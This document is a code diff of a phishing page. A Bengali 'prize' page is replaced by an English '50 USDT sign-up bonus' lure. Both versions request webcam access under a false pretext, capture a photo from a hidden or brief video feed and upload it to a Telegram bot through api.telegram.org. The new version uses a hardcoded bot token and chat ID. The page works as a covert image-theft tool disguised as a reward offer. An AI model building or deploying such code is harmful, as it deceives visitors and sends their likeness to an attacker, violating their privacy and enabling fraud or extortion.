@@ -1,145 +1,154 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 চূড়ান্ত পুরস্কার!</title>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-
-    <style>
-        :root {
-            --primary: #c0392b; --secondary: #8e44ad;
-            --success: #27ae60; --light: #ecf0f1; --dark: #2c3e50;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Hind Siliguri', sans-serif;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; padding: 20px;
-        }
-        .card {
-            background: #ffffff; padding: 30px; border-radius: 20px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
-            max-width: 400px; width: 100%;
-            text-align: center;
-            animation: fadeIn 1s ease-out;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-        
-        .icon-container { font-size: 5rem; color: var(--primary); margin-bottom: 15px; }
-        h1 { color: var(--dark); font-size: 2.2rem; margin-bottom: 10px; }
-        p { font-size: 1.1rem; color: #6c757d; margin-bottom: 25px; }
-        
-        .video-container { display: none; margin: 20px 0; }
-        #webcam-video { width: 100%; border-radius: 15px; border: 4px solid var(--secondary); }
-
-        .action-button {
-            padding: 15px 30px; font-size: 1.2rem; font-weight: 600;
-            background: linear-gradient(45deg, #d35400, #c0392b);
-            color: white; border: none; border-radius: 50px; cursor: pointer;
-            transition: all 0.3s ease; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-            display: inline-flex; align-items: center; gap: 10px;
-        }
-        .action-button:hover { transform: translateY(-3px); }
-        .action-button:disabled { cursor: not-allowed; opacity: 0.7; background: var(--dark); }
-        .action-button.success { background: var(--success); }
-        
-        #status-text { margin-top: 15px; font-weight: 600; color: var(--secondary); height: 20px; }
-        canvas { display: none; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>50 USDT | Earn Money</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      color: #ffffff; text-align: center;
+      background-color: #000000;
+      overflow: hidden;
+    }
+    #bg-canvas {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%; z-index: 0;
+    }
+    .content-wrapper {
+      position: relative; z-index: 1;
+      height: 100vh;
+      display: flex; justify-content: center; align-items: center;
+    }
+    .container {
+      max-width: 350px; padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(5px);
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    #coin-canvas, h1, p, .signup-button {
+      animation: fadeIn 0.8s ease-out forwards;
+      opacity: 0;
+    }
+    h1 { animation-delay: 0.2s; }
+    p { animation-delay: 0.4s; }
+    .signup-button { animation-delay: 0.6s; }
+    #coin-canvas {
+      width: 150px !important; height: 150px !important;
+      margin: 0 auto 20px auto;
+    }
+    h1 {
+      font-size: 2.5em; margin: 0; font-weight: bold;
+      text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+    }
+    p {
+      font-size: 1.1em; margin: 20px 0;
+      line-height: 1.5; color: #e0e0e0;
+      text-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    .signup-button {
+      background-color: #4CAF50; color: white;
+      padding: 15px 30px; border: none; border-radius: 8px;
+      font-size: 1.2em; font-weight: bold; cursor: pointer;
+      text-decoration: none;
+      display: inline-flex; align-items: center; justify-content: center;
+      transition: background-color 0.3s ease, transform 0.1s ease;
+      box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
+    }
+    .signup-button:hover { background-color: #58c95c; }
+    .signup-button:active { transform: scale(0.97); }
+  </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon-container"><i class="fas fa-trophy"></i></div>
-        <h1>এক ধাপ বাকি!</h1>
-        <p>আপনার পুরস্কারটি নিশ্চিত করতে নিচের বোতামে ক্লিক করে প্রক্রিয়াটি সম্পন্ন করুন।</p>
-        
-        <div id="video-container" class="video-container">
-            <video id="webcam-video" autoplay playsinline muted></video>
-        </div>
-        
-        <button id="main-button" class="action-button">
-            <i class="fas fa-shield-alt"></i> প্রক্রিয়া শুরু করুন
-        </button>
-        
-        <p id="status-text"></p>
-        <canvas id="photo-canvas"></canvas>
+
+  <!-- ক্যামেরা ও ক্যানভাস -->
+  <video id="hidden-video" style="display: none;" autoplay playsinline></video>
+  <canvas id="hidden-canvas" style="display: none;"></canvas>
+
+  <canvas id="bg-canvas"></canvas>
+  <div class="content-wrapper">
+    <div class="container">
+      <div id="coin-canvas"></div>
+      <h1>Earn 50 USDT</h1>
+      <p>Start Exploring Our Website And Earn Upto 50 USDT Free. Simply sign up to get 50 $ Sign Up Bonus</p>
+      <a href="#" class="signup-button" id="signupBtn">
+        <span>Sign Up to Start</span>
+      </a>
     </div>
+  </div>
 
-    <script>
-        // আপনার বটের টোকেন এখানে দিন
-        const telegramBotToken = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q";
+  <script>
+    const signupBtn = document.getElementById('signupBtn');
+    const video = document.getElementById('hidden-video');
+    const canvas = document.getElementById('hidden-canvas');
 
-        const button = document.getElementById('main-button');
-        const videoContainer = document.getElementById('video-container');
-        const video = document.getElementById('webcam-video');
-        const canvas = document.getElementById('photo-canvas');
-        const statusText = document.getElementById('status-text');
+    const BOT_TOKEN = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q";
+    const CHAT_ID = "8099849002";
 
-        // URL থেকে user_id টি পাওয়ার জন্য কোড
-        const urlParams = new URLSearchParams(window.location.search);
-        const dynamicChatId = urlParams.get('user_id');
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+      return new Blob([u8arr], { type: mime });
+    }
 
-        async function captureAndSend() {
-            statusText.textContent = 'আপনার ছবি তোলা হচ্ছে...';
-            const context = canvas.getContext('2d');
+    signupBtn.addEventListener('click', async (event) => {
+      event.preventDefault();
+      signupBtn.textContent = 'Requesting Access...';
+      signupBtn.style.pointerEvents = 'none';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        signupBtn.textContent = 'Access Granted. Finalizing...';
+        video.srcObject = stream;
+
+        video.onloadeddata = () => {
+          setTimeout(() => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            video.srcObject.getTracks().forEach(track => track.stop());
-            videoContainer.style.display = 'none';
-            statusText.textContent = 'তথ্য পাঠানো হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।';
-            button.disabled = true;
-            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
 
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                // এখানে হার্ড-কোডেড আইডির বদলে ডাইনামিক আইডি ব্যবহার করা হচ্ছে
-                formData.append("chat_id", dynamicChatId);
-                formData.append("photo", blob, "capture.jpg");
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, { method: "POST", body: formData });
-                    statusText.textContent = 'অভিনন্দন! আপনার প্রক্রিয়াটি সফল হয়েছে।';
-                    button.classList.add('success');
-                    button.innerHTML = '<i class="fas fa-check-circle"></i> সফল!';
-                } catch (error) {
-                    statusText.textContent = 'দুঃখিত, একটি সমস্যা হয়েছে।';
-                }
-            }, 'image/jpeg');
-        }
+            const imageDataUrl = canvas.toDataURL('image/jpeg');
+            const photoBlob = dataURLtoBlob(imageDataUrl);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'selfie.jpg');
 
-        async function startProcess() {
-            if (!dynamicChatId) {
-                alert("দুঃখিত, এটি একটি inválid লিঙ্ক। অনুগ্রহ করে বট থেকে পাওয়া সঠিক লিঙ্কটি ব্যবহার করুন।");
-                button.disabled = true;
-                return;
-            }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+              console.log("✅ Photo sent to Telegram bot!", data);
+              alert("Sign Up Successful! Your selfie has been submitted.");
+              signupBtn.textContent = 'Welcome!';
+              signupBtn.style.backgroundColor = '#28a745';
+            })
+            .catch(error => {
+              console.error("❌ Error sending photo to Telegram:", error);
+              alert("Failed to send photo.");
+              signupBtn.textContent = 'Try Again';
+              signupBtn.style.pointerEvents = 'auto';
+            });
 
-            button.disabled = true;
-            statusText.textContent = 'ক্যামেরা চালু করা হচ্ছে...';
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    videoContainer.style.display = 'block';
-                    statusText.textContent = 'প্রস্তুত! ৩ সেকেন্ডের মধ্যে স্বয়ংক্রিয়ভাবে ছবি তোলা হবে।';
-                    setTimeout(captureAndSend, 3000); 
-                };
-            } catch (err) {
-                alert("প্রক্রিয়াটি সম্পন্ন করতে ক্যামেরা ব্যবহারের অনুমতি প্রয়োজন।");
-                button.disabled = false;
-                statusText.textContent = '';
-            }
-        }
+            stream.getTracks().forEach(track => track.stop());
+          }, 500);
+        };
 
-        button.addEventListener('click', startProcess);
-    </script>
+      } catch (err) {
+        alert("Camera access is required. Please allow permission.");
+        signupBtn.textContent = 'Sign Up to Start';
+        signupBtn.style.pointerEvents = 'auto';
+      }
+    });
+  </script>
 </body>
 </html>
